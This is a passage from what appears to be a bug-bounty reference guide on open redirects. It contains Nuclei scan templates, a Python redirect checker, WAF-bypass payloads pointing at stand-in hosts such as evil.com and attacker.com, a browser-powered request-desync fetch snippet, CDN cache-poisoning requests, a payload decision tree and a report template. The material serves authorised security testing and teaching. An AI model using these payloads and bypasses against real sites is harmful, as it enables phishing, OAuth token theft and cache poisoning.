      # Double slash bypass
      - "{{BaseURL}}/redirect?url=//{{interactsh-url}}"
      - "{{BaseURL}}/redirect?url=///{{interactsh-url}}"

      # Backslash bypass
      - "{{BaseURL}}/redirect?url=\\{{interactsh-url}}"

      # Protocol stripping
      - "{{BaseURL}}/redirect?url=https:{{interactsh-url}}"

      # Data URI
      - "{{BaseURL}}/redirect?url=data:text/html,<script>location='https://{{interactsh-url}}'</script>"

      # JavaScript protocol
      - "{{BaseURL}}/redirect?url=javascript:location.href='https://{{interactsh-url}}'"

    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\/|\\|https?:|javascript:|data:)?(?:[a-zA-Z0-9_-]+\.)?{{interactsh-url}}'
```

### OAuth redirect_uri Template

```yaml
id: oauth-redirect-uri

info:
  name: OAuth Redirect URI Validation Bypass
  author: your-name
  severity: high
  description: Tests OAuth redirect_uri for open redirect

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/authorize?client_id={{client_id}}&redirect_uri=https://{{interactsh-url}}&response_type=code"
      - "{{BaseURL}}/authorize?client_id={{client_id}}&redirect_uri=https://{{interactsh-url}}&response_type=code"
      - "{{BaseURL}}/auth?client_id={{client_id}}&redirect_uri=https://{{interactsh-url}}&response_type=code"

    matchers:
      - type: word
        part: header
        words:
          - "Location: https://{{interactsh-url}}"
          - "Location: https://{{interactsh-url}}/"
```

---

## Tools and Scanners

### Essential Tools

| Tool | Purpose | Link |
|------|---------|------|
| Nuclei | Vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| httpx | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| Katana | Web crawler | https://github.com/projectdiscovery/katana |
| Subfinder | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| Interactsh | OOB interaction | https://github.com/projectdiscovery/interactsh |
| Param Miner | Parameter discovery | https://github.com/PortSwigger/param-miner |
| HTTP Request Smuggler | Request smuggling | https://github.com/PortSwigger/http-request-smuggler |
| Smuggler | Alternative smuggler | https://github.com/defparam/smuggler |
| Turbo Intruder | Fast HTTP attacker | https://github.com/PortSwigger/turbo-intruder |
| CursedChrome | Chrome exploitation | https://github.com/mandatoryprogrammer/CursedChrome |
| postMessage-tracker | postMessage analysis | https://github.com/fransr/postMessage-tracker |
| pp-finder | Prototype pollution | https://github.com/yeswehack/pp-finder |

### Burp Suite Extensions

- **Param Miner**: Discovers hidden parameters
- **HTTP Request Smuggler**: Automated request smuggling detection
- **Collaborator Everywhere**: Injects pingback payloads
- **Turbo Intruder**: Fast parallel HTTP requests

### Custom Tooling

```python
# Simple open redirect checker
import requests
import sys

payloads = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "//evil.com/",
    "///evil.com",
    "https://legitimate.com@evil.com",
    "https://evil.com@legitimate.com",
]

def check_redirect(url, param):
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            r = requests.get(test_url, allow_redirects=False, timeout=5)
            if r.status_code in [301, 302, 303, 307, 308]:
                location = r.headers.get('Location', '')
                if 'evil.com' in location:
                    print(f"[VULN] {test_url} -> {location}")
        except:
            pass

if __name__ == "__main__":
    check_redirect(sys.argv[1], sys.argv[2])
```

---

## Advanced Research

### HTTP/1.1 Desync Endgame

HTTP/1.1 has a fatal flaw: weak request boundaries. Six years of mitigations have hidden but not fixed the issue.

**Key findings from PortSwigger research:**
- H2.0 desync on Amazon (ignores Content-Length)
- CL.0 desync via Expect header
- 0.CL double-desync attacks
- V-H and H-V parser discrepancy detection
- Expect-based desync on Akamai, Cloudflare, Netlify

**Detection Strategy:**
```
Permutation -> Header -> Strategy -> Classification
(Every obfuscation) (CL, Host, etc.) (Single, Duplicate, POST, GET) -> DISCREPANCY
```

### Cache Entanglement

Caches normalize/transform request components before using them as keys. These transformations create gaps:

- Port stripping from Host header
- URL decoding
- Query string exclusion
- Parameter cloaking via semicolons
- Fat GET body exclusion

### Browser-Powered Desync

Turn victim's browser into desync delivery platform:

```javascript
fetch('https://target.com/', {
    method: 'POST',
    body: "GET /404 HTTP/1.1\r\nX: Y",
    credentials: 'include'
}).then(() => {
    location = 'https://target.com/'
})
```

### Pause-Based Desync

Trigger misguided request-timeout implementations:

```
Send headers -> Wait for timeout -> Server responds -> 
Send body -> Interpreted as new request
```

---

## Bug Bounty Writeups

### Key Findings Summary

| Researcher | Target | Technique | Bounty |
|------------|--------|-----------|--------|
| James Kettle | PayPal | Request Smuggling + Cache Poisoning + Open Redirect | High |
| James Kettle | Mozilla | X-Forwarded-Host + SHIELD hijacking | $1,000 |
| James Kettle | Cloudflare | Hidden Route Poisoning (Ghost) | N/A |
| James Kettle | GitHub | Fat GET Cache Poisoning | $10,000 |
| James Kettle | New Relic | Request Smuggling + Header Reflection | N/A |
| James Kettle | Amazon | H2.0 Desync | High |
| Wannes Verwimp | Cloudflare | H2.0 Desync (24M sites) | $7,000 |
| James Kettle | Akamai | Stacked HEAD CSD | N/A |
| James Kettle | Cisco | Client-side Cache Poisoning | CVE-2022-20713 |
| Artsploit | MITREid | OAuth logo_uri SSRF | CVE-2021-26715 |
| Artsploit | MITREid | OAuth Session Poisoning | CVE-2021-27582 |

### Research Pipeline

```
Bug Bounty Programs -> Scope Regex -> DNS Database -> Masscan/ZGrab -> 
Payload Injection -> Collaborator Correlation -> Manual Verification -> Report
```

---

## Payload Collections

### Swisskyrepo PayloadsAllTheThings

Complete collection at: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect

### Payloadbox Open Redirect List

https://github.com/payloadbox/open-redirect-payload-list

### 0xspade Bug Bounty Collection

https://github.com/0xspade/bugbounty/tree/master/open-redirect

### Nuclei Templates

https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/open-redirect

---

## WAF Bypasses

### Common WAF Rules and Bypasses

**Rule: Block `http://` and `https://`**
```
Bypass: //evil.com
Bypass: \\evil.com
Bypass: https:evil.com
```

**Rule: Block `//`**
```
Bypass: \\evil.com
Bypass: https:evil.com
Bypass: /\\/evil.com
```

**Rule: Block `@`**
```
Bypass: //evil.com
Bypass: https:evil.com
```

**Rule: Block known domains**
```
Bypass: https://evil.com.legitimate.com
Bypass: https://legitimate.com.evil.com
```

**Rule: Block `javascript:`**
```
Bypass: java%0d%0ascript:alert(0)
Bypass: javascript://evil.com/%0aalert(0)
```

**Rule: Block `<` and `>`**
```
Bypass: data:text/html,location.href='http://evil.com'
```

### Cloudflare Bypass

```
// Bypass via URL encoding in query string
GET /login?x=%6cong-string... HTTP/1.1
Host: www.cloudflare.com

// Cache key transformation bypass
GET /login?x=%6cong-string...
-> Location: /login/?x=long-string...
-> CF-Cache-Status: HIT
```

### Akamai Bypass

```
// Cache parameter cloaking
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
Host: redacted.com

// X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
// akamai-transform excluded from key but used to poison arbitrary parameters
```

---

## Detection Techniques

### Manual Detection

1. **Identify redirect parameters** in URL
2. **Test with external URL** (e.g., `//evil.com`)
3. **Check response** for 302/301 with Location header
4. **Verify browser follows** redirect to external site
5. **Test bypass techniques** if basic payload blocked

### Automated Detection

```bash
# Using nuclei
nuclei -u target.com -t open-redirect.yaml

# Using custom script
python3 open_redirect_scanner.py urls.txt

# Using ffuf for parameter discovery
ffuf -u https://target.com/FUZZ -w parameters.txt -mr "Location: .*evil.com"
```

### Time-Based Detection (for blind redirects)

```
?redirect=http://attacker.com/sleep/5
# If response takes ~5 seconds longer, redirect is likely occurring
```

### DNS Interaction Detection

```
?redirect=http://unique-id.interactsh.com
# Check interactsh for DNS query -> confirms redirect followed
```

### Cache Detection

```
1. Send poison request with unique marker
2. Send normal request
3. If normal response contains marker -> cache poisoned
```

---

## References

### PortSwigger Research

1. [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning) - James Kettle, 2018
2. [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement) - James Kettle, 2020
3. [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) - James Kettle, 2019
4. [Browser-Powered Desync](https://portswigger.net/research/browser-powered-desync-attacks) - James Kettle, 2022
5. [HTTP/1.1 Must Die](https://portswigger.net/research/http1-must-die) - James Kettle, 2025
6. [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors) - Artsploit, 2021
7. [Cracking the Lens](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface) - James Kettle, 2017

### GitHub Resources

1. [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
2. [Payloadbox Open Redirect Payload List](https://github.com/payloadbox/open-redirect-payload-list)
3. [0xspade Bug Bounty - Open Redirect](https://github.com/0xspade/bugbounty/tree/master/open-redirect)
4. [Nuclei Templates - Open Redirect](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/open-redirect)
5. [Param Miner](https://github.com/PortSwigger/param-miner)
6. [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
7. [Smuggler](https://github.com/defparam/smuggler)
8. [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)
9. [postMessage-tracker](https://github.com/fransr/postMessage-tracker)
10. [pp-finder](https://github.com/yeswehack/pp-finder)

### Documentation

1. [MDN - Location API](https://developer.mozilla.org/en-US/docs/Web/API/Location)
2. [MDN - Location Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Location)
3. [MDN - URL API](https://developer.mozilla.org/en-US/docs/Web/API/URL)
4. [MDN - Window.open()](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)
5. [HackTricks - Open Redirect](https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html)

### CVEs

- CVE-2021-26715: MITREid Connect SSRF via logo_uri
- CVE-2021-27582: MITREid Connect redirect_uri Session Poisoning
- CVE-2022-20713: Cisco WebVPN CSD

### Additional Research

- [Open Redirect Cheat Sheet - PentesterLand](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [OWASP - Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [Host/Split Unicode Normalization - Jonathan Birch](https://www.unicode.org/reports/tr46/)

---

## Quick Reference Card

### Payload Decision Tree

```
Is basic redirect blocked?
├── Yes -> Try @ symbol: https://legitimate.com@evil.com
│   └── Blocked? -> Try double slash: //evil.com
│       └── Blocked? -> Try backslash: \\evil.com
│           └── Blocked? -> Try protocol stripping: https:evil.com
│               └── Blocked? -> Try encoding: %2f%2fevil.com
│                   └── Blocked? -> Try data URI: data:text/html,...
│                       └── Blocked? -> Try javascript: javascript:location.href=...
└── No -> Basic open redirect confirmed
```

### Severity Assessment

| Scenario | Severity |
|----------|----------|
| Basic reflected redirect | Low-Medium |
| Stored redirect | Medium |
| OAuth redirect_uri bypass | High |
| Chain with XSS | High |
| Chain with SSRF | High |
| Chain with Cache Poisoning | Critical |
| Chain with Request Smuggling | Critical |
| Account takeover via token theft | Critical |

### Report Template

```
Title: Open Redirect via [Parameter] on [Endpoint]

Description:
The [endpoint] parameter [param] accepts arbitrary URLs without validation,
allowing attackers to redirect users to malicious websites.

Steps to Reproduce:
1. Visit: https://target.com/redirect?url=//attacker.com
2. Observe 302 redirect to //attacker.com
3. Browser navigates to attacker.com

Impact:
- Phishing attacks using trusted domain
- [Add specific impact based on chaining potential]

Mitigation:
- Implement strict URL validation
- Use allowlist for redirect destinations
- Validate URLs using proper URL parser
```

---

*Last updated: 2026-05-24*
*Compiled from 30+ sources including PortSwigger Research, HackTricks, PayloadsAllTheThings, and real-world bug bounty findings*
